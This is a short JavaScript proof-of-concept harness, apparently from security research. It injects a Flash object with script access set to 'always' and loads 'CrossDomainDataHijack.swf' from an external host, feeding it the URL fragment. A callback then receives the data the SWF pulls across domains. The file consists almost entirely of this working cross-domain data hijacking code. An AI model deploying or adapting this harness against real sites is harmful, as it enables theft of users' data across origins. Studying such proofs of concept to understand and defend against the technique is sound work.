var crossdomain = {
    /*
     * attributes for the object tag.
     * @type object
     */
    'attr': attr = {
        'id': 'myObject',
        'width': 100,
        'height': 100,
        'AllowScriptAccess': 'always'
    },
    /*
     * parameters for inside the object tag.
     * @type object
     */
    'param': param = {
        'AllowScriptAccess': 'always'
    },
    /*
     * The callback function receives all the data forwarded from the flash file.
     * @param string data
     * @return void
     */
    'callback': function (data) {
        console.log(data);
    },
    /*
     * This functions implements the flash object on the page.
     * @param string src
     * @return void
     */
    'create': function (src) {
        var i;
        this.attr.type = 'application/x-shockwave-flash';
        if (window.ActiveXObject) {
            this.attr.classid = 'clsid:d27cdb6e-ae6d-11cf-96b8-444553540000';
            this.param.movie = src;
        }
        else {
            this.attr.data = src;
        }

        var html = '<object';
        for (i in this.attr) {
            html += ' ' + i + '="' + this.attr[i] + '"';
        }
        html += '>';

        for (i in this.param) {
            html += '<param name="' + i + '" value="' + this.param[i] + '" />';
        }
        
        html += '</object>';
        document.write(html);
    }
};
sendToJavaScript = crossdomain.callback;
crossdomain.create('//www.olivierbeg.nl/xss/flash/CrossDomainDataHijack.swf?input=' + location.hash.substr(1));
